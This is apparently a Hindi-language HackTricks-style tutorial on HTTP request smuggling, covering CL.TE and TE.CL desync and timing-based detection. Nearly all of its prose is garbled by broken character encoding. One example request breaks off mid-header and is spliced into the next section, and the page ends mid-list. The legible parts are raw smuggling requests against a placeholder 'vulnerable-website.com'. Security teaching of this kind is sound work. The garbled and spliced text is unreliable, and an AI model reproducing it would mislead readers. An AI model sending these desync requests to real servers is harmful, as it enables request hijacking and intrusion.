# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рдореЗрд░рд╛** рдЯреНрд╡рд┐рдЯрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдХреНрдпрд╛ рд╣реИ

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдПрдХ **рдЕрд╕рдордВрддреНрд░рд┐рддреАрдХрд░рдг** рд╣реИ рдЬреЛ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА** рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдПрдХ HTTP **рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ **рдлреНрд░рдВрдЯ-рдПрдВрдб** рдкреНрд░реЙрдХреНрд╕реА (рд▓реЛрдб рдмреИрд▓реЗрдВрд╕/рд░рд┐рд╡рд░реНрд╕-рдкреНрд░реЙрдХреНрд╕реА) рджреНрд╡рд╛рд░рд╛ **рдПрдХрд▓ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ **2 рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВред\
рдЗрд╕рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдкрдиреЗ рдмрд╛рдж рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓реЗ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

### рд╕рд┐рджреНрдзрд╛рдВрдд

[**RFC рд╡рд┐рдирд┐рд░реНрджреЗрд╢рди (2161)**](https://tools.ietf.org/html/rfc2616)

> рдпрджрд┐ рдПрдХ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣реЗрдбрд░ рдХреНрд╖реЗрддреНрд░ рдФрд░ рдПрдХ рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ рд╣реЗрдбрд░ рдХреНрд╖реЗрддреНрд░ рджреЛрдиреЛрдВ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЕрдВрддрд┐рдо рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ**

> рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ рдПрдВрдЯрд┐рдЯреА рд╣реЗрдбрд░ рд╢рд░реАрд░ рдХрд╛ рдЖрдХрд╛рд░ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ, рдмрд╛рдЗрдЯ рдореЗрдВ, рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬрд╛ рдЧрдпрд╛ред

**рд╕реНрдерд╛рдирд╛рдВрддрд░рдг-рдХреЛрдбрд┐рдд: рдЯреБрдХрдбрд╝рд╛**

> рд╕реНрдерд╛рдирд╛рдВрддрд░рдг-рдХреЛрдбрд┐рдд рд╣реЗрдбрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдбрд┐рдд рдХрд░рдиреЗ рдХреЗ рд░реВрдк рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдкреЗрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред\
> рдЯреБрдХрдбрд╝рд╛ рдХрд╣рддрд╛ рд╣реИ рдХрд┐ рдмрдбрд╝реЗ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ

### рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛

**рдлреНрд░рдВрдЯ-рдПрдВрдб** (рд▓реЛрдб-рдмреИрд▓реЗрдВрд╕ / рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА) **content-length** рдпрд╛ **transfer-encoding** рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ **рджреВрд╕рд░рд╛** рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ 2 рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рдЕрд╕рдордВрддреНрд░рд┐рддреАрдХрд░рдг рд╣реЛрддрд╛ рд╣реИред\
рдпрд╣ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреА рдЬреЛ рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рджреНрд╡рд╛рд░рд╛ **рдПрдХрд▓ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░реЗрдЧрд╛ред рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЦрддрд░рд╛ рдЗрд╕ рддрдереНрдп рдореЗрдВ рдирд┐рд╣рд┐рдд рд╣реИ рдХрд┐ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ **рджреВрд╕рд░рд╛ рдЕрдиреБрд░реЛрдз рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛** рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░реЗрдЧрд╛ рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ **рдЕрдЧрд▓реЗ рдЧреНрд░рд╛рд╣рдХ рд╕реЗ рдЖрдпрд╛ рд╣реИ** рдФрд░ рдЙрд╕ рдЧреНрд░рд╛рд╣рдХ рдХрд╛ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз** **рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдЕрдиреБрд░реЛрдз** рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛрдЧрд╛ред

### рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ HTTP рдореЗрдВ **рдирдпрд╛ рдкрдВрдХреНрддрд┐ рд╡рд░реНрдг 2 рдмрд╛рдЗрдЯреЛрдВ рд╕реЗ рдмрдирд╛ рд╣реЛрддрд╛ рд╣реИ:**

* **Content-Length**: рдпрд╣ рд╣реЗрдбрд░ рдПрдХ **рджрд╢рдорд▓рд╡ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЕрдиреБрд░реЛрдз рдХреЗ рд╢рд░реАрд░ рдХреЗ **рдмрд╛рдЗрдЯреЛрдВ** рдХреА **рд╕рдВрдЦреНрдпрд╛** рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред рд╢рд░реАрд░ рдХреА рдЕрдВрддрд┐рдо рд╡рд░реНрдг рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреА рдЙрдореНрдореАрдж рд╣реИ, **рдЕрдиреБрд░реЛрдз рдХреЗ рдЕрдВрдд рдореЗрдВ рдирдИ рдкрдВрдХреНрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред
* **Transfer-Encoding:** рдпрд╣ рд╣реЗрдбрд░ **рдЕрдЧрд▓реЗ рдЯреБрдХрдбрд╝реЗ** рдХреА **рдмрд╛рдЗрдЯреЛрдВ** рдХреА **рд╕рдВрдЦреНрдпрд╛** рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред **рдЯреБрдХрдбрд╝рд╛** рдХреЛ рдПрдХ **рдирдИ рдкрдВрдХреНрддрд┐** рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдЗрд╕ рдирдИ рдкрдВрдХреНрддрд┐ рдХреЛ **рд▓рдВрдмрд╛рдИ рд╕реВрдЪрдХ рд╕реЗ рдЧрд┐рдирд╛ рдирд╣реАрдВ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рд╡рд┐рдзрд┐ рдХреЛ **0 рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдЯреБрдХрдбрд╝реЗ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ 2 рдирдИ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЕрдиреБрд╕рд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**: `0`
* **Connection**: рдореЗрд░реЗ рдЕрдиреБрднрд╡ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдкрд╣рд▓реЗ рдЕрдиреБрд░реЛрдз рдкрд░ **`Connection: keep-alive`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕реБрдЭрд╛рд╡рд┐рдд рд╣реИ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХреЗ рд▓рд┐рдПред

## рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рд╣рдорд▓реЗ рдЕрд╕реНрдкрд╖реНрдЯ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬреЛ рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рддрд░реАрдХреЗ рдореЗрдВ рдЕрдВрддрд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рд╡реЗ `Content-Length` (CL) рдФрд░ `Transfer-Encoding` (TE) рд╣реЗрдбрд░ рдХреЛ рдХреИрд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рд╣рдорд▓реЗ рд╡рд┐рднрд┐рдиреНрди рд░реВрдкреЛрдВ рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **CL.TE**, **TE.CL**, рдФрд░ **TE.TE** рдХреЗ рд░реВрдк рдореЗрдВред рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХрд╛рд░ рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рд╕рдВрдпреЛрдЬрди рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдХреИрд╕реЗ рдЗрди рд╣реЗрдбрд░реЛрдВ рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрддреЗ рд╣реИрдВред рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдПрдХ рд╣реА рдЕрдиреБрд░реЛрдз рдХреЛ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рд╕реЗ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рдиреЗ рд╕реЗ рдпреЗ рджреЛрд╖ рдЙрддреНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рджреБрд░реБрдкрдпреЛрдЧ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ (рдлреНрд░рдВрдЯ-рдПрдВрдб рджреНрд╡рд╛рд░рд╛ Content-Length рдХрд╛ рдЙрдкрдпреЛрдЧ, рдмреИрдХ-рдПрдВрдб рджреНрд╡рд╛рд░рд╛ Transfer-Encoding рдХрд╛ рдЙрдкрдпреЛрдЧ)
- **рдлреНрд░рдВрдЯ-рдПрдВрдб (CL):** `Content-Length` рд╣реЗрдбрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд╛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИред
- **рдмреИрдХ-рдПрдВрдб (TE):** `Transfer-Encoding` рд╣реЗрдбрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд╛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИред
- **рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рдкрд░рд┐рджреГрд╢реНрдп:**
- рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `Content-Length` рд╣реЗрдбрд░ рдХреА рдорд╛рди рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд╛рдордЧреНрд░реА рд▓рдВрдмрд╛рдИ рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддреАред
- рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рдорд╛рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреВрд░реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдмреИрдХ-рдПрдВрдб рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
- рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding: chunked` рд╣реЗрдбрд░ рдХреЗ рдХрд╛рд░рдг рдЕрдиреБрд░реЛрдз рдХреЛ рдЪрдВрдХреНрдб рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рддрд╛ рд╣реИ, рд╢реЗрд╖ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдЕрд▓рдЧ, рдЖрдЧрд╛рдореА рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддрд╛ рд╣реИред
- **рдЙрджрд╛рд╣рд░рдг:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep
```
Connection: Content-Length
```
## HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдЦреЛрдЬрдирд╛

HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХреА рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рдХрддрд╛ рдХреЛ рдкрд╣рдЪрд╛рдирдирд╛ рдЕрдХреНрд╕рд░ рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдорд╛рдирд┐рдкреБрд░рд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдЬрд╡рд╛рдм рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ рдЙрд╕реЗ рджреЗрдЦрдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИред рдпреЗ рддрдХрдиреАрдХреЗрдВ рд╕реАрдПрд▓.рдЯреА.рдИ рдФрд░ рдЯреАрдИ.рд╕реАрдПрд▓ рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИрдВред рдЗрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдРрд╕реА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд░рдгрдиреАрддрд┐рдпрд╛рдБ рдФрд░ рдЙрдкрдХрд░рдг рд╣реИрдВ рдЬреЛ рдЗрд╕ рддрд░рд╣ рдХреА рд░рд┐рдХреНрддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

### рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реАрдПрд▓.рдЯреА.рдИ рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛
- **рд╡рд┐рдзрд┐:**
- рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдЬреЛ, рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛрдЦрд┐рдорд╢реАрд▓ рд╣реИ, рддреЛ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдЧрд╛ред
- **рдЙрджрд╛рд╣рд░рдг:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **рдЕрд╡рд▓реЛрдХрди:**
- рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рдВрджреЗрд╢ рдХреЛ рдкрд╣рд▓реЗ рд╣реА рдХрд╛рдЯ рджреЗрддрд╛ рд╣реИред
- рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░, рдПрдХ рдЪрдВрдХ рдореЗрдВ рд╕рдВрджреЗрд╢ рдХреА рдЙрдореНрдореАрдж рд░рдЦрддреЗ рд╣реБрдП, рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрднреА рдирд╣реАрдВ рдЖрддрд╛, рдЬрд┐рд╕рд╕реЗ рджреЗрд░реА рд╣реЛрддреА рд╣реИред

- **рд╕рдВрдХреЗрддрдХ:**
- рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдордп рд╕рдорд╛рдкреНрддрд┐ рдпрд╛ рд▓рдВрдмреА рджреЗрд░реАред
- рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░ рд╕реЗ 400 рдмреИрдб рдЕрдиреБрд░реЛрдз рддреНрд░реБрдЯрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рдХрднреА-рдХрднреА рд╡рд┐рд╕реНрддреГрдд рд╕рд░реНрд╡рд░ рд╕реВрдЪрдирд╛ рдХреЗ рд╕рд╛рдеред

### рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреАрдИ.рд╕реАрдПрд▓ рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛
- **рд╡рд┐рдзрд┐:**
- рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдЬреЛ, рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛрдЦрд┐рдорд╢реАрд▓ рд╣реИ, рддреЛ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдЧрд╛ред
- **рдЙрджрд╛рд╣рд░рдг:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **рдЕрд╡рд▓реЛрдХрди:**
- рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding` рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреВрд░реЗ рд╕рдВрджреЗрд╢ рдХреЛ рдЖрдЧреЗ рднреЗрдЬрддрд╛ рд╣реИред
- рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░, `Content-Length` рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рдВрджреЗрд╢ рдХреА рдЙрдореНрдореАрдж рд░рдЦрддреЗ рд╣реБрдП, рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрднреА рдирд╣реАрдВ рдЖрддрд╛, рдЬрд┐рд╕рд╕реЗ рджреЗрд░реА рд╣реЛрддреА рд╣реИред

### рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд╡рд┐рдзрд┐рдпрд╛рдБ
- **рдЕрдВрддрд░реНрд╡рд┐рд╖реНрдЯрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг:**
- рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рд╕рдВрд╕реНрдХрд░рдг рднреЗрдЬреЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рдПрдХ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рддрд░реАрдХреЗ рдореЗрдВ рднрд┐рдиреНрди рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рд╡рд┐рд╕рдВрдЧрддрд┐ рдХрд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓реЗред

- **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ:**
